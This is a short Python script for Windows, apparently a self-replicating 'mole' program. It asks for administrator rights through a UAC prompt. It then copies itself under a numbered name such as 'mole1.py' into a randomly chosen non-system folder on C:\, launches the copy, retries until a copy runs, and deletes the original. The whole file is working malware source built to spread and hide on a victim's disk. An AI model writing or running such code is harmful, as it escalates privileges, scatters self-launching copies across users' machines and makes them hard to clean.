times = 0
PATH = ''
import random
import os
import ctypes
import subprocess
import sys



if ctypes.windll.shell32.IsUserAnAdmin():
    pass
else:
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, __file__, None, 1)
    sys.exit()


times = times+1
this = __file__


def non_sys():
    dictionary = []
    sys_dict = []
    for x in os.listdir('C:\\'):
        dictionary.append(x)
        for y in ('Settings', '$', 'Win', 'log', 'sys', 'Intel', 'log', 'Log', 'x86', 'Recovery', 'System', 'Windows', 'Program'):
            if y in x:
                sys_dict.append(x)
    dictionary = list(set(dictionary).symmetric_difference(set(sys_dict)))
    dictionary = random.choice(dictionary)
    return dictionary


def random_path():
    dictionary = []
    for x, y in enumerate(os.walk(os.path.expanduser('C:\\'+non_sys()))):
        dictionary.append(y)
    ranpath = random.choice(dictionary)[0]
    while(('python' in ranpath) or ('Python' in ranpath) or ('OneDrive' in ranpath)):
        ranpath = random.choice(dictionary)[0]
    return ranpath


next_path = random_path()+"\\mole"+str(times)+".py"
print(next_path)


def self_copy():
    with open(__file__, 'r')as this_file:
        this = this_file.readlines()[2:]
    temp = ''
    for x in this:
        temp = temp+x
    this = temp
    with open(next_path, 'w')as file:
        file.write('times=%s\nPATH=r"%s"\n%s' % (times, __file__, this))


def change():
    counter = 0
    global next_path
    while(os.path.isfile(next_path) != True and counter < 2):
        try:
            self_copy()
            subprocess.Popen('python '+next_path)
            counter = counter+1
        except:
            pass
    fail=True
    while(fail):
        try:
            next_path=random_path()
            self_copy()
            if os.path.isfile(next_path):
                subprocess.Popen('python '+next_path)
                fail=False
        except:
            next_path=random_path()
            self_copy()
            if os.path.isfile(next_path):
                subprocess.Popen('python '+next_path)
                fail=False
    os.remove(__file__)

change()
